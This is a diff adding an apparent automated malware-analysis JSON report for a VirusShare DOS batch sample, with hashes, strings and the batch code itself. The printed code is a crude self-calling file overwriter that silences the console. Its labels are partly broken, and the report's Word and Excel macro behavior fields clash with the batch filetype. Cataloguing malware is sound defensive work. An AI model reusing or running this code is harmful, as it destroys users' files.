@@ -1,0 +1,49 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "autoexec": "Runs when the Word document is opened",
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off\nctty nul\nif \"%1\"==\"autoexec.bat goto fin\nif \"%1\"==\"\" goto e1\nif not \"%1\"==\"\" goto e2\ngoto e3\n:e1\nctty nul\nfor %%x in (*.*) do call %0 %x\ngoto e3\nif not \"%tas\"== \"\" goto w02\nset tas=%1\ngoto e3\n:e02\ncopy %1 %tas\nset tas=%1\n:e3"
+    },
+    "filename": "VirusShare_2aa4acb6f378c1c5bd9da8addfae02f6",
+    "filesize": 252,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "2aa4acb6f378c1c5bd9da8addfae02f6",
+        "sha1": "f4f6da9be421aabf980632f9f960c1e583f6608c",
+        "sha256": "9e37367fdf9cf9b691cd8a6e0a472f477fb412ea3131ca3c184ebb609b28b511"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "ctty nul",
+            "if \"%1\"==\"autoexec.bat goto fin",
+            "if \"%1\"==\"\" goto e1",
+            "if not \"%1\"==\"\" goto e2",
+            "goto e3",
+            "ctty nul",
+            "for %%x in (*.*) do call %0 %x",
+            "goto e3",
+            "if not \"%tas\"== \"\" goto w02",
+            "set tas=%1",
+            "goto e3",
+            ":e02",
+            "copy %1 %tas",
+            "set tas=%1"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.250731",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
